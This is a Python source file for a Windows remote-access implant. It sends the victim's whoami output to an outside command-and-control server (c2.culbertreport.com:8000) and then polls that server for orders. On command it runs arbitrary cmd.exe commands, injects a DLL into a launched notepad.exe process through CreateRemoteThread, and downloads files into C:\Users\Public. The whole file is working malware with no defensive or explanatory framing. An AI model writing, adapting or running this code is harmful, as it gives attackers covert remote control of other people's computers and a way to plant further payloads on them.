import subprocess
from subprocess import PIPE
import sys
from ctypes import *
import psutil
import requests
import time


def get_pid(process_name):
    """
    Takes in a process name
    Returns a process ID
    """
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            return proc.pid


def dll_inject(dll_path, sacrificial_process='notepad.exe'):
    """
    Taken from grayhat Python
    Adapted for our use
    Requires a DLL path and a sacrificial_process is optional.
    If no process name is provided, notepad.exe will be used and them terminated
    """
    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
    pid = get_pid(sacrificial_process)
    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)
    kernel32 = windll.kernel32

    dll_len = len(dll_path)
    # Get a handle to the process we are injecting into.
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        print(f"[*] Couldn't acquire a handle to PID: {pid}")
        sys.exit(0)

    # Allocate some space for the DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
    # Write the DLL path into the allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))
    # We need to resolve the address for LoadLibraryA
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
    # Now we try to create the remote thread, with the entry point set
    # to LoadLibraryA and a pointer to the DLL path as its single parameter
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        print("[*] Failed to inject the DLL. Exiting.")
        sys.exit(0)
    print("[*] Remote thread with ID 0x%08x created." % thread_id.value)

    if sacrificial_process == 'notepad.exe':
        notepad.kill()  # Kill sacrificial process


def cmdexe(beacon_command):
    """
    This takes in a string to execute
    Returns the output if any available
    """
    DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN 
    results = subprocess.Popen(['cmd.exe', '/C', beacon_command], close_fds=True, creationflags=DETACHED_PROCESS,
                               stdout=PIPE)
    output = results.stdout.read()
    return output


def dwnld(url, ext):
    """
    This takes in a url and ext to download from
    The extension is required for when saving it
    """
    r = requests.get(url)
    open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)


# Get our name
who = subprocess.Popen('whoami', stdout=subprocess.PIPE)
who = who.stdout.read()

# Structure our name
headers = {'X-Transact': 'Action', 'Hello': str(who), 'ID': '1'}
data = {'ID': '1'}

# Send our name
r = requests.post('http://c2.culbertreport.com:8000', headers=headers, data=data)
#time.sleep(20)

while 1:
    a = requests.get('http://c2.culbertreport.com:8000', headers=headers)
    cmd = a.text
    print(cmd)
    op = cmd.split(';')[0]
    cm = cmd.split(';')[1]
    ex = cmd.split(';')[2]
    if op == 'cmd':
        output = cmdexe(cm)
        #r = requests.get('http://c2.culbertreport.com:8000', headers=headers, data=output)
    if op == 'inject':
        dll_inject(cm)
    if op == 'download':
        dwnld(cm, ex)
    else:
        time.sleep(1)
    time.sleep(20)
